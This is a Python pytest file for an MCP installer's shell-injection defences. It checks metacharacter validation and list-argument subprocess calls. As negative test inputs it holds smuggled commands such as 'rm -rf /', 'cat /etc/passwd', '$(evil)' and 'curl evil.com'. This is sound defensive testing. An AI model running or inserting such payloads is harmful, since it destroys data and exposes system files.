"""Tests for MCP installer security hardening (H-SEC1).

Validates that:
- CLI value validation rejects shell metacharacters
- subprocess calls use shell=False with list arguments
- Malicious inputs never reach subprocess
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from open_agent_kit.features.codebase_intelligence.mcp.installer import (
    MCPInstaller,
    _validate_cli_value,
)


class TestValidateCliValue:
    """Tests for _validate_cli_value allowlist validation."""

    def test_simple_name(self) -> None:
        _validate_cli_value("oak-ci", "server_name")

    def test_dotted_name(self) -> None:
        _validate_cli_value("oak.ci.v2", "server_name")

    def test_name_with_spaces(self) -> None:
        _validate_cli_value("oak ci mcp", "command")

    def test_underscored_name(self) -> None:
        _validate_cli_value("oak_ci", "server_name")

    def test_semicolon_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("oak-ci; rm -rf /", "server_name")

    def test_backtick_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("oak-ci`whoami`", "server_name")

    def test_pipe_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("oak-ci | cat /etc/passwd", "server_name")

    def test_dollar_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("$(evil)", "server_name")

    def test_ampersand_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("oak-ci & evil", "server_name")

    def test_newline_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("oak-ci\nevil", "server_name")

    def test_empty_string_rejected(self) -> None:
        with pytest.raises(ValueError, match="Unsafe characters"):
            _validate_cli_value("", "server_name")


def _make_mcp_config(
    install_cmd: str = "claude mcp add {name} --scope project -- {command}",
    remove_cmd: str = "claude mcp remove {name} --scope project",
) -> MagicMock:
    """Create a mock MCP config with CLI commands."""
    mcp_config = MagicMock()
    mcp_config.cli.install = install_cmd
    mcp_config.cli.remove = remove_cmd
    mcp_config.format = "json"
    mcp_config.config_file = ".mcp.json"
    mcp_config.servers_key = "mcpServers"
    mcp_config.entry_format = None
    return mcp_config


class TestInstallerShellFalse:
    """Tests that subprocess calls use shell=False with list args."""

    @patch("subprocess.run")
    @patch("shutil.which", return_value="/usr/bin/claude")
    def test_install_uses_list_args(
        self, mock_which: MagicMock, mock_run: MagicMock, tmp_path: Path
    ) -> None:
        """Install call passes a list (not string) to subprocess.run."""
        mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")

        installer = MCPInstaller(
            project_root=tmp_path,
            agent="claude",
            server_name="oak-ci",
            command="oak ci mcp",
        )
        installer._mcp_config = _make_mcp_config()
        result = installer._install_via_cli()

        assert result.success
        # Verify all subprocess.run calls used list args (shell=False is default)
        for call in mock_run.call_args_list:
            args = call[0][0]  # First positional arg
            assert isinstance(args, list), f"Expected list args, got {type(args)}: {args}"
            assert "shell" not in call[1] or call[1]["shell"] is False

    @patch("subprocess.run")
    @patch("shutil.which", return_value="/usr/bin/claude")
    def test_remove_uses_list_args(
        self, mock_which: MagicMock, mock_run: MagicMock, tmp_path: Path
    ) -> None:
        """Remove call passes a list (not string) to subprocess.run."""
        mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")

        installer = MCPInstaller(
            project_root=tmp_path,
            agent="claude",
            server_name="oak-ci",
            command="oak ci mcp",
        )
        installer._mcp_config = _make_mcp_config()
        result = installer._remove_via_cli()

        assert result.success
        for call in mock_run.call_args_list:
            args = call[0][0]
            assert isinstance(args, list), f"Expected list args, got {type(args)}: {args}"

    @patch("subprocess.run")
    @patch("shutil.which", return_value="/usr/bin/claude")
    def test_install_correct_shlex_split(
        self, mock_which: MagicMock, mock_run: MagicMock, tmp_path: Path
    ) -> None:
        """Verify shlex.split produces correct token list for Claude install."""
        mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")

        installer = MCPInstaller(
            project_root=tmp_path,
            agent="claude",
            server_name="oak-ci",
            command="oak ci mcp",
        )
        installer._mcp_config = _make_mcp_config()
        installer._install_via_cli()

        # The install call is the second subprocess.run (first is remove for idempotency)
        install_call = mock_run.call_args_list[-1]
        args = install_call[0][0]
        assert args == [
            "claude",
            "mcp",
            "add",
            "oak-ci",
            "--scope",
            "project",
            "--",
            "oak",
            "ci",
            "mcp",
        ]

    @patch("subprocess.run")
    @patch("shutil.which", return_value="/usr/bin/claude")
    def test_remove_correct_shlex_split(
        self, mock_which: MagicMock, mock_run: MagicMock, tmp_path: Path
    ) -> None:
        """Verify shlex.split produces correct token list for Claude remove."""
        mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")

        installer = MCPInstaller(
            project_root=tmp_path,
            agent="claude",
            server_name="oak-ci",
            command="oak ci mcp",
        )
        installer._mcp_config = _make_mcp_config()
        installer._remove_via_cli()

        args = mock_run.call_args_list[0][0][0]
        assert args == ["claude", "mcp", "remove", "oak-ci", "--scope", "project"]

    @patch("subprocess.run")
    @patch("shutil.which", return_value="/usr/bin/claude")
    def test_malicious_server_name_blocked(
        self, mock_which: MagicMock, mock_run: MagicMock, tmp_path: Path
    ) -> None:
        """Malicious server_name is rejected before subprocess is called."""
        installer = MCPInstaller(
            project_root=tmp_path,
            agent="claude",
            server_name="oak-ci; rm -rf /",
            command="oak ci mcp",
        )
        installer._mcp_config = _make_mcp_config()
        result = installer._install_via_cli()

        assert not result.success
        assert "validation error" in result.message.lower()
        mock_run.assert_not_called()

    @patch("subprocess.run")
    @patch("shutil.which", return_value="/usr/bin/claude")
    def test_malicious_command_blocked(
        self, mock_which: MagicMock, mock_run: MagicMock, tmp_path: Path
    ) -> None:
        """Malicious command is rejected before subprocess is called."""
        installer = MCPInstaller(
            project_root=tmp_path,
            agent="claude",
            server_name="oak-ci",
            command="oak ci mcp; curl evil.com",
        )
        installer._mcp_config = _make_mcp_config()
        result = installer._install_via_cli()

        assert not result.success
        assert "validation error" in result.message.lower()
        mock_run.assert_not_called()
